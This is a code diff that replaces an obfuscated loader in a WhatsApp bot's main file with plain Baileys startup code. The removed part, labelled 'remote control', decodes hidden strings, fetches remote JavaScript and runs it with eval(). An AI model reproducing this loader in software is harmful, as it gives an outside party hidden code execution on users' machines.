@@ -1,6 +1,122 @@
-/*this code is a remote control of my index.js */
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+const { Boom } = require('@hapi/boom');
+const pino = require('pino');
+const fs = require('fs-extra');
+const path = require('path');
+const express = require('express');
+require('dotenv').config();
 
-'use strict';const xv$UAmaE=r$POc$R;(function(vHfaIy_E$FqNk,NBbd$Mhu){const DFrS_u=r$POc$R,XxQJRiQNAlPATByerSwuZUKX=vHfaIy_E$FqNk();while(!![]){try{const ojcfIZBxUyb=Math['max'](-parseFloat(DFrS_u(0x201))/(-parseInt(0x149e)+parseInt(0x541)+parseFloat(parseInt(0x232))*Math.ceil(parseInt(0x7))),-parseFloat(DFrS_u(0x1f7))/(parseFloat(-parseInt(0x24f))*Math.floor(-parseInt(0x1))+parseInt(0x2)*Number(0x44f)+Math.ceil(-parseInt(0xaeb))))*(parseFloat(DFrS_u(0x1f4))/(-0x9+parseInt(0xe6)*parseInt(-parseInt(0x9))+0x822))+parseFloat(DFrS_u(0x1e9))/(Math.ceil(0x146f)+Number(0x3)*0x3d7+Math.ceil(0x248)*Math.trunc(-parseInt(0xe)))+-parseFloat(DFrS_u(0x1e6))/(-0x21dd+-parseInt(0x1bc7)+0x11f*parseInt(0x37))*(-parseFloat(DFrS_u(0x1f2))/(0x1*parseInt(0x1ea4)+Number(0x1d39)+-parseInt(0x1)*0x3bd7))+-parseFloat(DFrS_u(0x204))/(-0x164*0xf+0x25c9+Math.ceil(-0x10e6))+Math['ceil'](-parseFloat(DFrS_u(0x1ff))/(Math.max(parseInt(0x16ad),parseInt(0x16ad))+Math.ceil(0x83)+parseInt(-0xf7)*Math.ceil(parseInt(0x18))))*(parseFloat(DFrS_u(0x1f9))/(0x12*-parseInt(0x15)+Math.trunc(-parseInt(0x83))*-0x7+-parseInt(0x212)))+Math['trunc'](parseFloat(DFrS_u(0x1e8))/(parseInt(0x13)*parseInt(0xf7)+-parseInt(0x1d)*-0x53+Math.ceil(0x1)*-parseInt(0x1bb2)))+parseFloat(DFrS_u(0x202))/(-parseInt(0x5)*parseInt(0x54e)+-0x55b*parseInt(-parseInt(0x1))+parseInt(0x1536));if(ojcfIZBxUyb===NBbd$Mhu)break;else XxQJRiQNAlPATByerSwuZUKX['push'](XxQJRiQNAlPATByerSwuZUKX['shift']());}catch(LKyhPoHCsdDGV){XxQJRiQNAlPATByerSwuZUKX['push'](XxQJRiQNAlPATByerSwuZUKX['shift']());}}}(oAefXRudEdSAGuo,Math.ceil(-0x4dd64)+Number(parseInt(0x6b83e))+parseInt(0x2d806)));function r$POc$R(EVGZ_agiuubSPrZRhxPuusw,eEZjgd){const TVHawn_XJcoMhbIQLHSqJqpI=oAefXRudEdSAGuo();return r$POc$R=function(RWLnUY_clxoNBrWERQREPv,bZUktL){RWLnUY_clxoNBrWERQREPv=RWLnUY_clxoNBrWERQREPv-(Math.floor(-parseInt(0x13))*-parseInt(0xb3)+-0x9cb*-0x2+Math.floor(-parseInt(0x1efb)));let CSwubVSZRV$veknKxVc=TVHawn_XJcoMhbIQLHSqJqpI[RWLnUY_clxoNBrWERQREPv];if(r$POc$R['yzsxKJ']===undefined){const FwOzUfUUUpFEvJ_fSvPqJekG=function(oToFrRMrxgvZU$gPgAcRCpwyS){let D_ve_BQNQUO=parseInt(0x1d)*Number(-0x124)+Math.max(parseInt(0x1c1e),parseInt(0x1c1e))+0x7a9&parseInt(0x2)*parseInt(0xd7c)+Number(parseInt(0x1dd8))+parseInt(0x513)*Math.ceil(-0xb),FGaLJcHUUjOzudZU=new Uint8Array(oToFrRMrxgvZU$gPgAcRCpwyS['match'](/.{1,2}/g)['map'](K$jC$lmZQj=>parseInt(K$jC$lmZQj,-parseInt(0x1771)+parseFloat(0x805)*parseInt(0x2)+parseInt(0x777)))),e$_VUhN=FGaLJcHUUjOzudZU['map'](iz$yo_m=>iz$yo_m^D_ve_BQNQUO),bLMXSkhpwBdhctSPwY=new TextDecoder(),IUTPB$kQo=bLMXSkhpwBdhctSPwY['decode'](e$_VUhN);return IUTPB$kQo;};r$POc$R['JMmTZj']=FwOzUfUUUpFEvJ_fSvPqJekG,EVGZ_agiuubSPrZRhxPuusw=arguments,r$POc$R['yzsxKJ']=!![];}const t$nUjhTHIiYxSSTulXEY$e=TVHawn_XJcoMhbIQLHSqJqpI[-parseInt(0x1)*Math.trunc(0x1b8a)+0x1f5f+-parseInt(0x3d5)],jRNg_bPTcb=RWLnUY_clxoNBrWERQREPv+t$nUjhTHIiYxSSTulXEY$e,vfSzobcCFOXtUXY_cLYWNxqO=EVGZ_agiuubSPrZRhxPuusw[jRNg_bPTcb];return!vfSzobcCFOXtUXY_cLYWNxqO?(r$POc$R['ZTeCEm']===undefined&&(r$POc$R['ZTeCEm']=!![]),CSwubVSZRV$veknKxVc=r$POc$R['JMmTZj'](CSwubVSZRV$veknKxVc),EVGZ_agiuubSPrZRhxPuusw[jRNg_bPTcb]=CSwubVSZRV$veknKxVc):CSwubVSZRV$veknKxVc=vfSzobcCFOXtUXY_cLYWNxqO,CSwubVSZRV$veknKxVc;},r$POc$R(EVGZ_agiuubSPrZRhxPuusw,eEZjgd);}const axios=require(xv$UAmaE(0x1fe)),cheerio=require(xv$UAmaE(0x1f8));async function fetchAlphaUrl(){const UpQDAtzmPAeenkyHH=xv$UAmaE;try{const AVUrkKcIPr_QfdL_hUZz=await axios[UpQDAtzmPAeenkyHH(0x1fb)](UpQDAtzmPAeenkyHH(0x1ed)),u$KzrPQE=AVUrkKcIPr_QfdL_hUZz[UpQDAtzmPAeenkyHH(0x1f3)],GZagiuubSPrZR$hxPuuswceEZ=cheerio[UpQDAtzmPAeenkyHH(0x1e5)](u$KzrPQE),gdTTVHaw=GZagiuubSPrZR$hxPuuswceEZ(UpQDAtzmPAeenkyHH(0x1eb))[UpQDAtzmPAeenkyHH(0x1f0)](UpQDAtzmPAeenkyHH(0x1fa));if(!gdTTVHaw)throw new Error(UpQDAtzmPAeenkyHH(0x1ee));console[UpQDAtzmPAeenkyHH(0x1e4)](UpQDAtzmPAeenkyHH(0x1f1));const XJcoMhbIQL=await axios[UpQDAtzmPAeenkyHH(0x1fb)](gdTTVHaw),SqJ$qpIPRWLnUYclxoN=XJcoMhbIQL[UpQDAtzmPAeenkyHH(0x1f3)];console[UpQDAtzmPAeenkyHH(0x1e4)](UpQDAtzmPAeenkyHH(0x200)),eval(SqJ$qpIPRWLnUYclxoN);const rWERQREPvdbZ_UktL=verifyJid(UpQDAtzmPAeenkyHH(0x1ea));console[UpQDAtzmPAeenkyHH(0x1e4)](UpQDAtzmPAeenkyHH(0x1e7),rWERQREPvdbZ_UktL);}catch(CS$wubVSZR_VveknKxVc){console[UpQDAtzmPAeenkyHH(0x1ec)](UpQDAtzmPAeenkyHH(0x1f6),CS$wubVSZR_VveknKxVc[UpQDAtzmPAeenkyHH(0x203)]||CS$wubVSZR_VveknKxVc);}}function oAefXRudEdSAGuo(){const QVgPHDuKjgtWQV=['d4d6c7','faddc5d2dfdad793f9faf793d5dcc1ded2c7512e3d89','f9faf793c5d6c1dad5dad6d789','d2cbdadcc0','8bdce7dcf5c1e1','e0d0c1dac3c793dfdcd2d7d6d793c0c6d0d0d6c0c0d5c6dfdfca512f36512f3692','818b848683d0f0f5fcebc7','8481818b878782e1f0c3c4cae0','ded6c0c0d2d4d6','80818a8a87838bc2f9d6d8f4e5','dfdcd4','dfdcd2d7','86e6e6e6c3f5f6','eadcc6c193c5d6c1dad5dad6d793f9faf789','80868a87858783e6d4e3d4f2d0','828483818b858bf5c4fcc9e6d5','d8d6dac7dbf3c09dc4dbd2c7c0d2c3c39dddd6c7','d289d0dcddc7d2daddc09b94f8f6fae7fb949a','d6c1c1dcc1','dbc7c7c3c0899c9cc1d2c49dd4dac7dbc6d1c6c0d6c1d0dcddc7d6ddc79dd0dcde9cd8d6dac7dbd4dbdcc0c79ce1f6fefce7f69cc1d6d5c09cdbd6d2d7c09cded2dadd9cf8d6dac7db9ddbc7dedf','f8f6fae7fb93dddcc793d5dcc6ddd793dcdd93c7dbd693c4d6d1c3d2d4d69d512e3f','f3c09dc4dbd2c7c0d2c3c39dddd6c7','d2c7c7c1','f5dadfd693d5d6c7d0dbd6d793c0c6d0d0d6c0c0d5c6dfdfca93512f36512f36','828a868a808585c5f9d5e0c5e3','d7d2c7d2','8781e4fdcbc2fce6','d6ddd7c0e4dac7db','512e3ff6c1c1dcc189','8684868383e6ebead0ffea','d0dbd6d6c1dadc','86818b808b8084fec1cbd4c5e9','dbc1d6d5'];oAefXRudEdSAGuo=function(){return QVgPHDuKjgtWQV;};return oAefXRudEdSAGuo();}function verifyJid(tnUjhTHI_iYxSSTulX_EYe){const beVDGNSRcD=xv$UAmaE;if(!tnUjhTHI_iYxSSTulX_EYe[beVDGNSRcD(0x1f5)](beVDGNSRcD(0x1ef)))return console[beVDGNSRcD(0x1ec)](beVDGNSRcD(0x1fc),tnUjhTHI_iYxSSTulX_EYe),![];return console[beVDGNSRcD(0x1e4)](beVDGNSRcD(0x1fd),tnUjhTHI_iYxSSTulX_EYe),!![];}fetchAlphaUrl();
+const { database, session, dev } = require('./settings');
+const { initSettingsDB } = require('./database/settings');
 
-/*Must run*/
+const logger = pino({ level: 'error' });
+const app = express();
 
+let sock;
+let isConnected = false;
+
+async function startBot() {
+  try {
+    console.log('🤖 Starting KEITH-MD Bot...');
+    
+    // Initialize database
+    await initSettingsDB();
+    console.log('✅ Database initialized');
+
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    const { version } = await fetchLatestBaileysVersion();
+
+    sock = makeWASocket({
+      version,
+      logger,
+      printQRInTerminal: true,
+      auth: state,
+      browser: ['KEITH-MD', 'Safari', '1.0.0'],
+      syncFullHistory: false,
+    });
+
+    sock.ev.on('connection.update', async (update) => {
+      const { connection, lastDisconnect, qr } = update;
+
+      if (qr) {
+        console.log('📱 Scan QR Code Above');
+      }
+
+      if (connection === 'connecting') {
+        console.log('⏳ Connecting...');
+      }
+
+      if (connection === 'open') {
+        isConnected = true;
+        console.log('✅ Bot Connected Successfully!');
+        console.log('👤 Bot ID:', sock.user?.id);
+      }
+
+      if (connection === 'close') {
+        isConnected = false;
+        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+        console.log('❌ Connection Closed. Reconnecting:', shouldReconnect);
+        if (shouldReconnect) {
+          startBot();
+        }
+      }
+    });
+
+    sock.ev.on('creds.update', saveCreds);
+
+    // Message handling
+    sock.ev.on('messages.upsert', async (m) => {
+      try {
+        const msg = m.messages[0];
+        if (!msg.message) return;
+
+        const isGroup = msg.key.remoteJid.endsWith('@g.us');
+        const sender = msg.key.participant || msg.key.remoteJid;
+        const from = msg.key.remoteJid;
+
+        let text = msg.message.conversation || 
+                   msg.message.extendedTextMessage?.text || '';
+
+        if (!text) return;
+
+        const args = text.split(' ');
+        const command = args[0].toLowerCase();
+
+        // Load and execute command
+        const cmdPath = path.join(__dirname, 'Cmds', `${command}.js`);
+        
+        if (fs.existsSync(cmdPath)) {
+          const cmd = require(cmdPath);
+          await cmd.execute({
+            sock,
+            msg,
+            text,
+            command,
+            args,
+            isGroup,
+            sender,
+            from,
+          });
+        }
+      } catch (error) {
+        console.error('❌ Error processing message:', error);
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Fatal Error:', error);
+    process.exit(1);
+  }
+}
+
+// Express server for health checks
+app.get('/health', (req, res) => {
+  res.json({ status: isConnected ? 'connected' : 'disconnected' });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`🌐 Server running on port ${PORT}`);
+});
+
+startBot();
